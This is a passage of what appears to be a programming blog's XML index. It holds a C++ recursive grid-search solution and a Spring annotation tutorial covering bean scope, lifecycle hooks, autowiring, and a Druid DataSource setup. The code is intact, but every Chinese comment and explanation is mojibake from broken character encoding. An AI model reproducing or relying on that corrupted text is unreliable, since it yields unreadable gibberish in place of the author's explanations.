‡ï¼Œæ‰‹é‡Œç‰©å“æ•°ï¼Œæ‰‹é‡Œæœ€å¤§ä»·å€¼</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">&gt;</span>n<span class="token operator">||</span>y<span class="token operator">&gt;</span>m<span class="token operator">||</span>cnt<span class="token operator">&gt;</span>k<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">//è¶Šç•Œ</span><span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">==</span>n<span class="token operator">&amp;&amp;</span>y<span class="token operator">==</span>m<span class="token punctuation">)</span><span class="token comment">//åˆ°è¾¾ç»ˆç‚¹</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cnt<span class="token operator">==</span>k<span class="token operator">||</span><span class="token punctuation">(</span>cnt<span class="token operator">==</span>k<span class="token operator">-</span><span class="token number">1</span><span class="token operator">&amp;&amp;</span>g<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token operator">&gt;</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">//è‹¥åœ¨æœ€åæ‰‹ä¸­æ•°é‡ç­‰äºkï¼Œ</span>            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>                       <span class="token comment">//æˆ–è€…æœ€åæ‰‹ä¸­æ•°é‡ç­‰äºk-1ä¸”æœ€åçš„ç‰©å“ä»·å€¼å¤§äºå‰é¢æ‰€æœ‰çš„ç‰©å“ä»·å€¼çš„æœ€å¤§å€¼                        </span>        <span class="token keyword">else</span>                               <span class="token comment">//ï¼ˆæ„æ€å¯ä»¥æ‹¿æœ€åä¸€ä»¶ï¼Œæ‹¿äº†æ­£å¥½æ‰‹ä¸­ç‰©å“æ•°é‡ç­‰äºkï¼‰</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>g<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">&gt;</span> value<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">dfs</span><span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>y<span class="token punctuation">,</span>cnt<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>g<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">dfs</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>cnt<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>g<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">dfs</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>cnt<span class="token punctuation">,</span>value<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">dfs</span><span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>y<span class="token punctuation">,</span>cnt<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//å–ï¼Œå»ä¸‹ä¸€æ­¥ï¼Œå–ï¼Œå»å³ä¸€æ­¥ï¼Œä¸å–ï¼Œå»å³ä¸€æ­¥ï¼Œå–ï¼Œå»ä¸‹ä¸€æ­¥</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token function">dfs</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>cnt<span class="token punctuation">,</span>value<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">dfs</span><span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>y<span class="token punctuation">,</span>cnt<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>cin<span class="token operator">&gt;&gt;</span>n<span class="token operator">&gt;&gt;</span>m<span class="token operator">&gt;&gt;</span>k<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>m<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span> cin<span class="token operator">&gt;&gt;</span>g<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//è¡¨ç¤ºä»(1,1)å¼€å§‹ï¼Œæ‰‹ä¸­æ²¡æœ‰ç‰©å“ä¸”ä»·å€¼ä¸º-1ã€‚</span> res <span class="token operator">=</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>MOD<span class="token punctuation">;</span> cout<span class="token operator">&lt;&lt;</span>res<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³• </tag>
            
            <tag> é€’å½’ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Springæ¡†æ¶ï¼ˆä¸‰ï¼‰</title>
      <link href="/2022/03/30/spring-kuang-jia-san/"/>
      <url>/2022/03/30/spring-kuang-jia-san/</url>
      
        <content type="html"><![CDATA[<h2 id="Beanç®¡ç†ï¼ˆæ³¨è§£å¼€å‘ï¼‰"><a href="#Beanç®¡ç†ï¼ˆæ³¨è§£å¼€å‘ï¼‰" class="headerlink" title="Beanç®¡ç†ï¼ˆæ³¨è§£å¼€å‘ï¼‰"></a>Beanç®¡ç†ï¼ˆæ³¨è§£å¼€å‘ï¼‰</h2><p>é‡‡ç”¨çº¯æ³¨è§£å¼€å‘</p><p>çœ‹ä¸€ä¸‹é¡¹ç›®ç›®å½•</p><img src="image-20220401075455404.png" style="zoom:80%;"><ul><li>SpringConfigureé…ç½®ç±»</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yang<span class="token punctuation">.</span>configure</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ComponentScan</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span><span class="token punctuation">;</span><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token string">"com.yang"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfigure</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>APPæµ‹è¯•ç±»</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> APP <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">AnnotationConfigApplicationContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigApplicationContext</span><span class="token punctuation">(</span><span class="token class-name">SpringConfigure</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BookDao</span> bookDao1 <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">BookDao</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BookDao</span> bookDao2 <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">BookDao</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>bookDao1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>bookDao2<span class="token punctuation">)</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æµ‹è¯•ä¸‹æ¥æ²¡æœ‰é—®é¢˜</p><img src="image-20220401075630110.png"><ul><li>å’Œæ³¨è§£å¼€å‘ä¸€æ ·åœ¨beanåé¢åŠ ä¸ª<code>scope</code>å³å¯</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yang<span class="token punctuation">.</span>doc<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>yang<span class="token punctuation">.</span>doc<span class="token punctuation">.</span></span><span class="token class-name">BookDao</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Scope</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Repository</span><span class="token punctuation">;</span><span class="token annotation punctuation">@Repository</span><span class="token annotation punctuation">@Scope</span><span class="token punctuation">(</span><span class="token string">"prototype"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookDaoImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookDao</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"BookDao save......"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>è¿è¡Œç»“æœå‘ç°ä¸¤ä¸ªåœ°å€ä¸ä¸€æ ·</li></ul><p><img src="/2022/03/30/spring-kuang-jia-san/image-20220401075958145.png"></p><ul><li>é”€æ¯åˆ›å»ºbeanï¼Œåªè¦æ·»åŠ ä¸¤ä¸ªæ³¨è§£å³å¯</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Repository</span><span class="token annotation punctuation">@Scope</span><span class="token punctuation">(</span><span class="token string">"prototype"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookDaoImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookDao</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"BookDao save......"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//@PostConstructè®¾ç½®beançš„åˆå§‹åŒ–æ–¹æ³•ï¼Œä¸å‡½æ•°åç§°æ— å…³</span>    <span class="token annotation punctuation">@PostConstruct</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"init ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//@PreDestroyè®¾ç½®beançš„é”€æ¯æ–¹æ³•ï¼Œä¸å‡½æ•°åç§°æ— å…³</span>    <span class="token annotation punctuation">@PreDestroy</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"destroy ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ä¾èµ–æ³¨å…¥ï¼ˆæ³¨è§£å¼€å‘ï¼‰"><a href="#ä¾èµ–æ³¨å…¥ï¼ˆæ³¨è§£å¼€å‘ï¼‰" class="headerlink" title="ä¾èµ–æ³¨å…¥ï¼ˆæ³¨è§£å¼€å‘ï¼‰"></a>ä¾èµ–æ³¨å…¥ï¼ˆæ³¨è§£å¼€å‘ï¼‰</h2><p> <strong>ä½¿ç”¨@Autowiredæ³¨è§£å¼€å¯è‡ªåŠ¨è£…é…æ¨¡å¼ï¼ˆæŒ‰ç±»å‹ï¼‰</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookService</span> <span class="token punctuation">{</span>    <span class="token comment">//@Autowiredï¼šæ³¨å…¥å¼•ç”¨ç±»å‹ï¼Œè‡ªåŠ¨è£…é…æ¨¡å¼ï¼Œé»˜è®¤æŒ‰ç±»å‹è£…é…</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">BookDao</span> bookDao<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book service save ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bookDao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>å¯ä»¥ä¸ç”¨setterå‡½æ•°ï¼šè‡ªåŠ¨è£…é…åŸºäºåå°„è®¾è®¡åˆ›å»ºå¯¹è±¡å¹¶æš´åŠ›åå°„å¯¹åº”å±æ€§ä¸ºç§æœ‰å±æ€§åˆå§‹åŒ–æ•°æ®ï¼Œå› æ­¤æ— éœ€æä¾›setteræ–¹æ³•ã€‚è¿™å…¶å®æœ‰æ‚–äºIOCç†å¿µï¼Œä½ å·²ç»ä¸æä¾›å…¥å£äº†ï¼Œä½†å®ƒç®€å•å•Šï¼</p></blockquote><p><strong>ä½¿ç”¨@Qualifieræ³¨è§£æŒ‡å®šè¦è£…é…çš„beanåç§°</strong></p><p>è§£å†³IOCå®¹å™¨ä¸­åŒç±»å‹Beanæœ‰å¤šä¸ªè£…é…å“ªä¸€ä¸ªçš„é—®é¢˜</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookService</span> <span class="token punctuation">{</span>    <span class="token comment">//@Autowiredï¼šæ³¨å…¥å¼•ç”¨ç±»å‹ï¼Œè‡ªåŠ¨è£…é…æ¨¡å¼ï¼Œé»˜è®¤æŒ‰ç±»å‹è£…é…</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token comment">//@Qualifierï¼šè‡ªåŠ¨è£…é…beanæ—¶æŒ‰beanåç§°è£…é…</span>    <span class="token annotation punctuation">@Qualifier</span><span class="token punctuation">(</span><span class="token string">"bookDao"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">BookDao</span> bookDao<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book service save ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bookDao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>@Qualifieræ³¨è§£æ— æ³•å•ç‹¬ä½¿ç”¨ï¼Œå¿…é¡»é…åˆ@Autowiredæ³¨è§£ä½¿ç”¨</p><p><strong>ä½¿ç”¨@Valueå®ç°ç®€å•ç±»å‹æ³¨å…¥</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Repository</span><span class="token punctuation">(</span><span class="token string">"bookDao"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookDaoImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookDao</span> <span class="token punctuation">{</span>    <span class="token comment">//@Valueï¼šæ³¨å…¥ç®€å•ç±»å‹ï¼ˆæ— éœ€æä¾›setæ–¹æ³•ï¼‰</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${name}"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book dao save ..."</span> <span class="token operator">+</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>@Valueæ³¨è§£ä¸­ä½¿ç”¨${name}ä»å±æ€§æ–‡ä»¶ä¸­è¯»å–nameå€¼ï¼Œé‚£ä¹ˆå°±éœ€è¦åœ¨é…ç½®ç±»æˆ–è€…é…ç½®æ–‡ä»¶ä¸­åŠ è½½å±æ€§æ–‡ä»¶ã€‚</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token string">"com.itheima"</span><span class="token punctuation">)</span><span class="token comment">//@PropertySourceåŠ è½½propertiesé…ç½®æ–‡ä»¶</span><span class="token annotation punctuation">@PropertySource</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"classpath:jdbc.properties"</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment">//{}å¯ä»¥çœç•¥ä¸å†™</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>@PropertySource()ä¸­åŠ è½½å¤šæ–‡ä»¶è¯·ä½¿ç”¨æ•°ç»„æ ¼å¼é…ç½®ï¼Œ<strong>ä¸å…è®¸ä½¿ç”¨é€šé…ç¬¦</strong>*</p><p><strong>æ³¨è§£å¼€å‘ç®¡ç†ç¬¬ä¸‰æ–¹Beanï¼š</strong></p><p>åœ¨pomå®‰è£…ä¾èµ–durid</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>druid<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.1.16<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>å•ç‹¬å®šä¹‰é…ç½®ç±»ï¼ˆåœ¨configureæ–‡ä»¶å¤¹ä¸‹ï¼Œå¯¼å…¥Jdbcé…ç½®æ–‡ä»¶ï¼‰</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcConfig</span> <span class="token punctuation">{</span>    <span class="token comment">//@Beanï¼šè¡¨ç¤ºå½“å‰æ–¹æ³•çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªbeanå¯¹è±¡ï¼Œæ·»åŠ åˆ°IOCå®¹å™¨ä¸­</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">DataSource</span> <span class="token function">dataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">DruidDataSource</span> ds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DruidDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ds<span class="token punctuation">.</span><span class="token function">setDriverClassName</span><span class="token punctuation">(</span><span class="token string">"com.mysql.jdbc.Driver"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ds<span class="token punctuation">.</span><span class="token function">setUrl</span><span class="token punctuation">(</span><span class="token string">"jdbc:mysql://localhost:3306/spring_db"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ds<span class="token punctuation">.</span><span class="token function">setUsername</span><span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ds<span class="token punctuation">.</span><span class="token function">setPassword</span><span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ds<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>å°†ç‹¬ç«‹çš„é…ç½®ç±»åŠ å…¥æ ¸å¿ƒé…ç½®</li></ul><p>@Importæ³¨è§£å¯¼å…¥å¼</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token string">"com.itheima"</span><span class="token punctuation">)</span><span class="token comment">//@Import:å¯¼å…¥é…ç½®ä¿¡æ¯</span><span class="token annotation punctuation">@Import</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token class-name">JdbcConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>æ³¨è§£å¼€å‘ä¸ºç¬¬ä¸‰æ–¹Beanæ³¨å…¥èµ„æº</strong></p><p>é…ç½®ç±»ä¸­æ³¨å…¥ç®€å•ç±»å‹ï¼Œæ³¨å…¥å¼•ç”¨ç±»å‹</p><ul><li>ç®€å•ç±»å‹ï¼ˆä¹Ÿæ˜¯ç”¨valueè¿›è¡Œæ³¨å…¥ï¼‰</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcConfig</span> <span class="token punctuation">{</span>    <span class="token comment">//1.å®šä¹‰ä¸€ä¸ªæ–¹æ³•è·å¾—è¦ç®¡ç†çš„å¯¹è±¡</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"com.mysql.jdbc.Driver"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> driver<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"jdbc:mysql://localhost:3306/spring_db"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> url<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> userName<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> password<span class="token punctuation">;</span>    <span class="token comment">//2.@Beanï¼šè¡¨ç¤ºå½“å‰æ–¹æ³•çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªbeanå¯¹è±¡ï¼Œæ·»åŠ åˆ°IOCå®¹å™¨ä¸­</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">DataSource</span> <span class="token function">dataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">DruidDataSource</span> ds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DruidDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ds<span class="token punctuation">.</span><span class="token function">setDriverClassName</span><span class="token punctuation">(</span>driver<span class="token punctuation">)</span><span class="token punctuation">;</span>        ds<span class="token punctuation">.</span><span class="token function">setUrl</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span 